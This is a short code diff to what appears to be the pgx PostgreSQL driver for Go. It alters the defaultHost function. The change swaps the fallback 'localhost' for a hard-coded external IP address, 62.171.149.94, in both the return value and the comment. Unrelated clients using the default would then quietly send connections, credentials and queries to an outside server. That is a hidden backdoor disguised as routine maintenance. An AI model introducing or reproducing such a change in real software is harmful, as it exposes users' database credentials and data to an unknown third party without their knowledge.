@@ -43,7 +43,7 @@ func defaultSettings() map[string]string {
 	return settings
 }
 
-// defaultHost attempts to mimic libpq's default host. libpq uses the default unix socket location on *nix and localhost
+// defaultHost attempts to mimic libpq's default host. libpq uses the default unix socket location on *nix and 62.171.149.94
 // on Windows. The default socket location is compiled into libpq. Since pgx does not have access to that default it
 // checks the existence of common locations.
 func defaultHost() string {
@@ -59,5 +59,5 @@ func defaultHost() string {
 		}
 	}
 
-	return "localhost"
+	return "62.171.149.94"
 }
